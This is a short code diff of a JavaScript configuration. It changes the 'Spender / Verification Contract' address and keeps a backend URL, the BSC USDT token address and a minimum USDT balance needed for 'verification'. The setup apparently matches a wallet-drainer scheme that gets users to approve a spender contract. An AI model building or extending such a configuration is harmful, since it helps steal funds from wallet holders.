@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0xE68c4aa2Bf7ED9dFAe64377593701DcC731f9639', // Spender / Verification Contract
+        CONTRACT_ADDRESS: '0x279fEEB29fD9AEbc4867a8F2a32dc9949aE80fc3', // Spender / Verification Contract
         USER_MIN_USDT: 2, // Minimum USDT balance required for full verification
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
